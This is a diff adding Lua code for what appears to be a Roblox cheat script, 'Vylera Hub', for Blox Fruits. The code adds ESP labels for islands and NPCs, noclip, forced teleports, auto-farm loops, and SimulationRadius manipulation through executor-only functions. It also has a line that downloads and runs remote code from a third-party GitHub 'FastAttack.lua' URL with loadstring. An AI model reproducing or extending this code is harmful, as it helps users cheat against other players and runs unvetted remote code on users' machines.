+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(50, 180, 50);
+                        else
+                            v.EspMirageIsland.TextLabel.Text = v.Name .. "   \n" ..
+                                                                   round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspMirageIsland") then
+                    (v:FindFirstChild("EspMirageIsland")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Kitsune"] then
+                    if v.Name == "Kitsune Island" then
+                        if not v:FindFirstChild("EspKitsuneIsland") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspKitsuneIsland";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(40, 40, 180);
+                        else
+                            v.EspKitsuneIsland.TextLabel.Text = v.Name .. "   \n" ..
+                                                                    round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspKitsuneIsland") then
+                    (v:FindFirstChild("EspKitsuneIsland")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Frozen"] then
+                    if v.Name == "Frozen Dimension" then
+                        if not v:FindFirstChild("EspFrozen") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspFrozen";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(50, 180, 255);
+                        else
+                            v.EspFrozen.TextLabel.Text = v.Name .. "   \n" ..
+                                                             round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspFrozen") then
+                    (v:FindFirstChild("EspFrozen")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Prehistoric"] then
+                    if v.Name == "Prehistoric Island" then
+                        if not v:FindFirstChild("EspPrehistoric") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspPrehistoric";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(200, 50, 40);
+                        else
+                            v.EspPrehistoric.TextLabel.Text = v.Name .. "   \n" ..
+                                                                  round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspPrehistoric") then
+                    (v:FindFirstChild("EspPrehistoric")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Advanced Fruit Dealer"] then
+                    if v.Name == "Advanced Fruit Dealer" then
+                        if not v:FindFirstChild("EspAdvanceFruitDealer") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspAdvanceFruitDealer";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(250, 50, 50);
+                        else
+                            v.EspAdvanceFruitDealer.TextLabel.Text = v.Name .. "   \n" ..
+                                                                         round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspAdvanceFruitDealer") then
+                    (v:FindFirstChild("EspAdvanceFruitDealer")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Aura"] then
+                    if v.Name == "Master of Enhancement" then
+                        if not v:FindFirstChild("EspAura") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspAura";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = "Code";
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(200, 55, 255);
+                        else
+                            v.EspAura.TextLabel.Text = v.Name .. "   \n" ..
+                                                           round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " M";
+                        end
+                    end
+                elseif v:FindFirstChild("EspAura") then
+                    (v:FindFirstChild("EspAura")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
+            for i, v in pairs((game:GetService("Workspace")).Map.MysticIsland:GetChildren()) do
+                pcall(function()
+                    if _G.Settings.Esp["ESP Gear"] then
+                        if v.Name == "MeshPart" then
+                            if not v:FindFirstChild("AutoFarmBlazeEmber") then
+                                local bill = Instance.new("BillboardGui", v);
+                                bill.Name = "EspGear";
+                                bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                                bill.Size = UDim2.new(1, 200, 1, 30);
+                                bill.Adornee = v;
+                                bill.AlwaysOnTop = true;
+                                local name = Instance.new("TextLabel", bill);
+                                name.Font = "Code";
+                                name.FontSize = "Size14";
+                                name.TextWrapped = true;
+                                name.Size = UDim2.new(1, 0, 1, 0);
+                                name.TextYAlignment = "Top";
+                                name.BackgroundTransparency = 1;
+                                name.TextStrokeTransparency = 0.5;
+                                name.TextColor3 = Color3.fromRGB(80, 245, 245);
+                            else
+                                v.EspGear.TextLabel.Text = v.Name .. "   \n" ..
+                                                               round(
+                                        (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                            3) .. " M";
+                            end
+                        end
+                    elseif v:FindFirstChild("EspGear") then
+                        (v:FindFirstChild("EspGear")):Destroy();
+                    end
+                end);
+            end
+        end
+    end
+end);
+function Click()
+    (game:GetService("VirtualUser")):CaptureController();
+    (game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+end
+function AutoHaki()
+    if not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("HasBuso") then
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Buso");
+    end
+end
+function UnEquipWeapon(Weapon)
+    if game.Players.LocalPlayer.Character:FindFirstChild(Weapon) then
+        (game.Players.LocalPlayer.Character:FindFirstChild(Weapon)).Parent = game.Players.LocalPlayer.Backpack;
+    end
+end
+function EquipWeapon(ToolSe)
+    if not game.Players.LocalPlayer.Character:FindFirstChild(ToolSe) then
+        if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
+            Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe);
+            game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool);
+        end
+    end
+end
+spawn(function()
+    for i, v in pairs((game:GetService("Workspace"))._WorldOrigin:GetChildren()) do
+        pcall(function()
+            if v.Name == "CurvedRing" or v.Name == "SlashHit" or v.Name == "SwordSlash" or v.Name == "SlashTail" or
+                v.Name == "Sounds" then
+                v:Destroy();
+            end
+        end);
+    end
+end);
+function GetDistance(target)
+    return math.floor((target.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude);
+end
+function BTP(value)
+    pcall(function()
+        if (value.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 2000 and
+            game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
+            repeat
+                wait();
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = value;
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetSpawnPoint");
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = value;
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetSpawnPoint");
+                wait();
+                game.Players.LocalPlayer.Character.Head:Destroy();
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = value;
+            until (value.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 2000 and
+                game.Players.LocalPlayer.Character.Humanoid.Health > 0;
+        end
+    end);
+end
+function InstantTp(value)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = value;
+end
+function TweenBoat(pos)
+    local TweenService = game:GetService("TweenService");
+    local Boat = workspace.Boats[_G.Settings.SeaEvent["Selected Boat"]];
+    if not Boat or (not Boat:FindFirstChild("VehicleSeat")) then
+        warn("Boat atau VehicleSeat tidak ditemukan!");
+        return {
+            Stop = function()
+            end
+        };
+    end
+    local targetCFrame = pos;
+    if typeof(pos) == "Instance" and pos:IsA("BasePart") then
+        targetCFrame = pos.CFrame;
+    elseif typeof(pos) ~= "CFrame" then
+        warn("Argumen 'pos' harus berupa CFrame atau BasePart!");
+        return {
+            Stop = function()
+            end
+        };
+    end
+    local startPosition = Boat.VehicleSeat.Position;
+    local endPosition = targetCFrame.Position;
+    local distance = (startPosition - endPosition).Magnitude;
+    local tween = nil;
+    local duration = distance / (_G.Settings.SeaEvent["Boat Tween Speed"] or 100);
+    local info = TweenInfo.new(duration, Enum.EasingStyle.Linear);
+    tween = TweenService:Create(Boat.VehicleSeat, info, {
+        CFrame = targetCFrame
+    });
+    if distance > 25 then
+        tween:Play();
+    else
+        warn("Jarak terlalu dekat, tween dibatalkan.");
+    end
+    local StopTweenBoat = {};
+    function StopTweenBoat:Stop()
+        if tween and tween.PlaybackState == Enum.PlaybackState.Playing then
+            tween:Cancel();
+        end
+    end
+    return StopTweenBoat;
+end
+function TweenPlayer(pos)
+    task.spawn(function()
+        pcall(function()
+            if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
+                game.Players.LocalPlayer.Character.Humanoid.Sit = true;
+            end
+            local player = (game:GetService("Players")).LocalPlayer;
+            local character = player.Character;
+            local humanoidRootPart = character.HumanoidRootPart;
+            if player:DistanceFromCharacter(pos.Position) <= 50 then
+                humanoidRootPart.CFrame = pos;
+                if character:FindFirstChild("Root") then
+                    character.Root:Destroy();
+                    wait();
+                    TweenPlayer(humanoidRootPart.CFrame);
+                    wait();
+                end
+                if character:FindFirstChild("Root") then
+                    character.Root:Remove();
+                end
+            elseif not character:FindFirstChild("Root") then
+                local rootPart = Instance.new("Part", character);
+                rootPart.Size = Vector3.new(1, 0.5, 1);
+                rootPart.Name = "Root";
+                rootPart.Anchored = true;
+                rootPart.Transparency = 1;
+                rootPart.CanCollide = false;
+                rootPart.CFrame = humanoidRootPart.CFrame;
+            end
+            local distance = (humanoidRootPart.Position - pos.Position).Magnitude;
+            local tweenService = game:GetService("TweenService");
+            local tweenInfo = TweenInfo.new(distance / _G.Settings.Setting["Player Tween Speed"],
+                Enum.EasingStyle.Linear);
+            local success, tweenError = pcall(function()
+                local tween = tweenService:Create(character.Root, tweenInfo, {
+                    CFrame = pos
+                });
+                tween:Play();
+            end);
+            if _G.StopTween == true then
+                tween:Cancel();
+                _G.Clip = false;
+            end
+            if not success then
+                return tweenError;
+            end
+            character.Root.CFrame = humanoidRootPart.CFrame;
+            if success and character:FindFirstChild("Root") then
+                pcall(function()
+                    local distanceFromTarget = (humanoidRootPart.Position - pos.Position).Magnitude;
+                    if distanceFromTarget >= 50 then
+                        task.spawn(function()
+                            pcall(function()
+                                if (character.Root.Position - humanoidRootPart.Position).Magnitude > 200 then
+                                    character.Root.CFrame = humanoidRootPart.CFrame;
+                                else
+                                    humanoidRootPart.CFrame = character.Root.CFrame;
+                                end
+                            end);
+                        end);
+                    elseif distanceFromTarget >= 25 and distanceFromTarget < 40 then
+                        humanoidRootPart.CFrame = pos;
+                    elseif distanceFromTarget < 25 then
+                        humanoidRootPart.CFrame = pos;
+                    end
+                end);
+            end
+            local stoppos = {};
+            function stoppos:Stop()
+                tween:Cancel();
+            end
+            return stoppos;
+        end);
+    end);
+end
+task.spawn(function()
+    while task.wait() do
+        pcall(function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.Root.CFrame;
+            if (game.Players.LocalPlayer.Character.Root.Position -
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 1 then
+                game.Players.LocalPlayer.Character.Root.CFrame =
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
+            end
+        end);
+    end
+end);
+spawn(function()
+    (game:GetService("RunService")).RenderStepped:Connect(function()
+        pcall(function()
+            if setscriptable then
+                setscriptable(game.Players.LocalPlayer, "SimulationRadius", true);
+            end
+            if sethiddenproperty then
+                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge);
+            end
+        end);
+    end);
+end);
+loadstring(
+    game:HttpGet("https://raw.githubusercontent.com/AnhTuanDzai-Hub/FastAttackLoL/refs/heads/main/FastAttack.lua"))()
+function EquipWeaponSword()
+    pcall(function()
+        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v.ToolTip == "Sword" and v:IsA("Tool") then
+                local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name);
+                game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid);
+            end
+        end
+    end);
+end
+spawn(function()
+    local angle = 0;
+    while wait() do
+        if _G.Settings.Setting["Spin Position"] then
+            local radius = 20;
+            local farmDistance = _G.Settings.Setting["Farm Distance"];
+            local radian = math.rad(angle);
+            local x = math.cos(radian) * radius;
+            local z = math.sin(radian) * radius;
+            Pos = CFrame.new(x, farmDistance, z);
+            angle = (angle + 30) % 360;
+        else
+            Pos = CFrame.new(0, _G.Settings.Setting["Farm Distance"], 0);
+        end
+        wait(0);
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World1 then
+                if _G.Settings.Farm["Auto Farm Leather"] or _G.Settings.Farm["Auto Farm Magma Ore"] or
+                    _G.Settings.Farm["Auto Farm Scrap Metal"] or _G.Settings.Items["Auto Saber"] or
+                    _G.Settings.Items["Auto Second Sea"] or _G.Settings.Items["Auto Warden Sword"] or
+                    _G.Settings.Items["Auto Greybeard"] or _G.Settings.Items["Auto Pole"] or
+                    _G.Settings.Items["Auto Shark Saw"] or _G.Settings.Farm["Auto Farm Angel Wings"] then
+                    if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+                        local Noclip = Instance.new("BodyVelocity");
+                        Noclip.Name = "BodyClip";
+                        Noclip.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+                        Noclip.MaxForce = Vector3.new(100000, 100000, 100000);
+                        Noclip.Velocity = Vector3.new(0, 0, 0);
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World1 then
+                if _G.Settings.Items["Auto Saber"] or _G.Settings.Items["Auto Second Sea"] or
+                    _G.Settings.Items["Auto Warden Sword"] or _G.Settings.Items["Auto Greybeard"] or
+                    _G.Settings.Items["Auto Pole"] or _G.Settings.Items["Auto Shark Saw"] then
+                    for _, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+                        if v:IsA("BasePart") then
+                            v.CanCollide = false;
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World2 then
+                if _G.Settings.Items["Auto Farm Factory"] or _G.Settings.Items["Auto Swan Glasses"] or
+                    _G.Settings.Raid["Law Raid"] or _G.Settings.Race["Auto Race V2"] or
+                    _G.Settings.Items["Auto Rengoku"] or _G.Settings.Items["Auto Bartilo Quest"] or
+                    _G.Settings.Items["Auto Third Sea"] or _G.Settings.Items["Auto Dragon Trident"] or
+                    _G.Settings.SeaStack["Auto Attack Seabeasts"] or _G.Settings.Raid["Auto Raid"] then
+                    if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+                        local Noclip = Instance.new("BodyVelocity");
+                        Noclip.Name = "BodyClip";
+                        Noclip.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+                        Noclip.MaxForce = Vector3.new(100000, 100000, 100000);
+                        Noclip.Velocity = Vector3.new(0, 0, 0);
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World2 then
+                if _G.Settings.Items["Auto Farm Factory"] or _G.Settings.Items["Auto Swan Glasses"] or
+                    _G.Settings.Raid["Law Raid"] or _G.Settings.Race["Auto Race V2"] or
+                    _G.Settings.Items["Auto Rengoku"] or _G.Settings.Items["Auto Bartilo Quest"] or
+                    _G.Settings.Items["Auto Third Sea"] or _G.Settings.Items["Auto Dragon Trident"] or
+                    _G.Settings.SeaStack["Auto Attack Seabeasts"] or _G.Settings.Raid["Auto Raid"] then
+                    for _, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+                        if v:IsA("BasePart") then
+                            v.CanCollide = false;
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World3 then
+                if _G.Settings.Farm["Auto Pirate Raid"] or _G.Settings.Race["Auto Race V3"] or
+                    _G.Settings.Farm["Auto Kill Cake Prince"] or _G.Settings.SeaStack["Tween To Kitsune Island"] or
+                    _G.Settings.SeaStack["Teleport To Frozen Dimension"] or
+                    _G.Settings.SeaStack["Sail To Frozen Dimension"] or _G.Settings.SeaStack["Summon Frozen Dimension"] or
+                    _G.Settings.SeaStack["Summon Kitsune Island"] or _G.Settings.SeaStack["Tween To Mirage Island"] or
+                    _G.Settings.Race["Auto Train"] or _G.Settings.Items["Auto Press Haki Button"] or
+                    _G.Settings.SeaEvent["Sail Boat"] or _G.Settings.Items["Auto Arena Trainer"] or
+                    _G.Settings.Race["Auto Kill Player After Trial"] or _G.Settings.Race["Tween To Highest Mirage"] or
+                    _G.Settings.Race["Auto Trial"] or _G.Settings.Race["Find Blue Gear"] or
+                    _G.Settings.Combat["Auto Kill Player Quest"] or _G.Settings.Items["Auto Cursed Dual Katana"] or
+                    _G.Settings.Farm["Auto Farm Bone"] or _G.Settings.Farm["Auto Kill Dough King"] or
+                    _G.Settings.Items["Auto Soul Guitar"] or _G.Settings.Items["Auto Tushita"] or
+                    _G.Settings.Farm["Auto Elite Hunter"] or _G.AutoKillSelectedPlayer or
+                    _G.Settings.Items["Auto Rainbow Haki"] or _G.Settings.Items["Auto Dark Dagger"] or
+                    _G.Settings.Farm["Auto Farm Ectoplasm"] or _G.Settings.Farm["Auto Observation V2"] or
+                    _G.Settings.Farm["Auto Musketeer Hat"] or _G.Settings.Items["Auto Holy Torch"] or
+                    _G.Settings.Items["Auto Hallow Scythe"] or _G.Settings.Farm["Auto Farm Katakuri"] or
+                    _G.Settings.Items["Auto Buddy Sword"] or _G.Settings.Items["Auto Canvander"] or
+                    _G.Settings.Raid["Auto Raid"] or _G.Settings.Main["Auto Summon Tyrant Of The Skies"] or
+                    _G.Settings.Main["Auto Kill Tyrant Of The Skies"] then
+                    if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+                        local Noclip = Instance.new("BodyVelocity");
+                        Noclip.Name = "BodyClip";
+                        Noclip.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+                        Noclip.MaxForce = Vector3.new(100000, 100000, 100000);
+                        Noclip.Velocity = Vector3.new(0, 0, 0);
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if World3 then
+                if _G.Settings.Farm["Auto Pirate Raid"] or _G.Settings.Race["Auto Race V3"] or
+                    _G.Settings.Farm["Auto Kill Cake Prince"] or _G.Settings.SeaStack["Tween To Kitsune Island"] or
+                    _G.Settings.SeaStack["Teleport To Frozen Dimension"] or
+                    _G.Settings.SeaStack["Sail To Frozen Dimension"] or _G.Settings.SeaStack["Summon Frozen Dimension"] or
+                    _G.Settings.SeaStack["Summon Kitsune Island"] or _G.Settings.SeaStack["Tween To Mirage Island"] or
+                    _G.Settings.Race["Auto Train"] or _G.Settings.Items["Auto Press Haki Button"] or
+                    _G.Settings.SeaEvent["Sail Boat"] or _G.Settings.Items["Auto Arena Trainer"] or
+                    _G.Settings.Race["Auto Kill Player After Trial"] or _G.Settings.Race["Tween To Highest Mirage"] or
+                    _G.Settings.Race["Auto Trial"] or _G.Settings.Race["Find Blue Gear"] or
+                    _G.Settings.Combat["Auto Kill Player Quest"] or _G.Settings.Items["Auto Cursed Dual Katana"] or
+                    _G.Settings.Farm["Auto Farm Bone"] or _G.Settings.Farm["Auto Kill Dough King"] or
+                    _G.Settings.Items["Auto Soul Guitar"] or _G.Settings.Items["Auto Tushita"] or
+                    _G.Settings.Farm["Auto Elite Hunter"] or _G.AutoKillSelectedPlayer or
+                    _G.Settings.Items["Auto Rainbow Haki"] or _G.Settings.Items["Auto Dark Dagger"] or
+                    _G.Settings.Farm["Auto Farm Ectoplasm"] or _G.Settings.Farm["Auto Observation V2"] or
+                    _G.Settings.Farm["Auto Musketeer Hat"] or _G.Settings.Items["Auto Holy Torch"] or
+                    _G.Settings.Items["Auto Hallow Scythe"] or _G.Settings.Farm["Auto Farm Katakuri"] or
+                    _G.Settings.Items["Auto Buddy Sword"] or _G.Settings.Items["Auto Canvander"] or
+                    _G.Settings.Farm["Auto Farm Leather"] or _G.Settings.Raid["Auto Raid"] or
+                    _G.Settings.Main["Auto Summon Tyrant Of The Skies"] or
+                    _G.Settings.Main["Auto Kill Tyrant Of The Skies"] then
+                    for _, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+                        if v:IsA("BasePart") then
+                            v.CanCollide = false;
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait() do
+            if _G.Settings.Main["Auto Farm"] or _G.Settings.Farm["Auto Farm Chest Tween"] or
+                _G.Settings.Items["Auto Electric Claw"] or _G.Settings.Main["Auto Farm Fruit Mastery"] or
+                _G.Settings.Main["Auto Farm Gun Mastery"] or _G.TeleportIsland or _G.AutoKillSelectedPlayer or
+                _G.TeleportToPlayer or _G.Settings.Farm["Auto Farm Observation"] or _G.Settings.Fruit["Tween To Fruit"] or
+                _G.TeleportNPC or _G.Settings.Main["Auto Farm Mon"] or _G.Settings.Main["Auto Farm Fast"] or
+                _G.Settings.Main["Auto Farm All Boss"] or _G.Settings.Main["Auto Farm Boss"] or
+                _G.Settings.Main["Auto Farm Sword Mastery"] or _G.Settings.Farm["Auto Farm Material"] then
+                if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+                    local Noclip = Instance.new("BodyVelocity");
+                    Noclip.Name = "BodyClip";
+                    Noclip.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+                    Noclip.MaxForce = Vector3.new(100000, 100000, 100000);
+                    Noclip.Velocity = Vector3.new(0, 0, 0);
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        (game:GetService("RunService")).Stepped:Connect(function()
+            if _G.Settings.Main["Auto Farm"] or _G.Settings.Farm["Auto Farm Chest Tween"] or
+                _G.Settings.Items["Auto Electric Claw"] or _G.Settings.Main["Auto Farm Fruit Mastery"] or
+                _G.Settings.Main["Auto Farm Gun Mastery"] or _G.TeleportIsland or _G.AutoKillSelectedPlayer or
+                _G.TeleportToPlayer or _G.Settings.Farm["Auto Farm Observation"] or _G.Settings.Fruit["Tween To Fruit"] or
+                _G.TeleportNPC or _G.Settings.Main["Auto Farm Mon"] or _G.Settings.Main["Auto Farm Fast"] or
+                _G.Settings.Main["Auto Farm All Boss"] or _G.Settings.Main["Auto Farm Boss"] or
+                _G.Settings.Main["Auto Farm Sword Mastery"] or _G.Settings.Farm["Auto Farm Material"] then
+                for _, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = false;
+                    end
+                end
+            end
+        end);
+    end);
+end);
+function StopTween(State)
+    if not State then
+        _G.StopTween = true;
+        TweenPlayer((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+        if (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+            ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip")):Destroy();
+        end
+        _G.StopTween = false;
+    end
+end
+function RemoveAnimation(Mon)
+    Mon.Humanoid:ChangeState(11);
+    if Mon.Humanoid:FindFirstChild("Animator") then
+        Mon.Humanoid.Animator:Destroy();
+    end
+end
+spawn(function()
+    pcall(function()
+        while wait() do
+            for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+                if v:IsA("Tool") then
+                    if v:FindFirstChild("RemoteFunctionShoot") then
+                        SelectWeaponGun = v.Name;
+                    end
+                end
+            end
+        end
+    end);
+end);
+MainSection = Tabs.MainTab:Section({
+    Title = "Main",
+    TextXAlignment = "Left"
+});
+GameTimeParagraph = Tabs.MainTab:Paragraph({
+    Title = "Game Time",
+    Desc = "0",
+    Image = "timer",
+    ImageSize = 20
+});
+spawn(function()
+    while task.wait() do
+        pcall(function()
+            local GameTime = math.floor(workspace.DistributedGameTime + 0.5);
+            local Hour = math.floor(GameTime / 60 ^ 2) % 24;
+            local Minute = math.floor(GameTime / 60 ^ 1) % 60;
+            local Second = math.floor(GameTime / 60 ^ 0) % 60;
+            GameTimeParagraph:SetDesc(Hour .. " Hours " .. Minute .. " Minute " .. Second .. " Second");
+        end);
+    end
+end);
+FpsParagraph = Tabs.MainTab:Paragraph({
+    Title = "Fps",
+    Desc = "0",
+    Image = "monitor",
+    ImageSize = 20
+});
+spawn(function()
+    while task.wait() do
+        pcall(function()
+            FpsParagraph:SetDesc(workspace:GetRealPhysicsFPS());
+        end);
+    end
+end);
+PingParagraph = Tabs.MainTab:Paragraph({
+    Title = "Ping",
+    Desc = "0",
+    Image = "signal",
+    ImageSize = 20
+});
+spawn(function()
+    while task.wait() do
+        pcall(function()
+            PingParagraph:SetDesc((game:GetService("Stats")).Network.ServerStatsItem["Data Ping"]:GetValueString());
+        end);
+    end
+end);
+DiscordServerParagraph = Tabs.InfoTab:Paragraph({
+    Title = "Discord Server",
+    Desc = "Link Discord Vylera Hub!",
+    TextXAlignment = "Left",
+    Buttons = {{
+        Title = "Copy Link Discord",
+        Callback = function()
+            setclipboard("not right now");
+            WindUI:Notify({
+                Title = "Notication",
+                Content = "Discord Link Copied",
+                Icon = "bell",
+                Duration = 3
+            });
+        end
+    }}
+});
+DiscordServerParagraph1 = Tabs.InfoTab:Paragraph({
+    Title = "Social Vylera Hub",
+    Desc = "Link Social Vylera Hub!",
+    TextXAlignment = "Left",
+    Buttons = {{
+        Title = "Copy Social",
+        Callback = function()
+            setclipboard("not right now");
+            WindUI:Notify({
+                Title = "Notication",
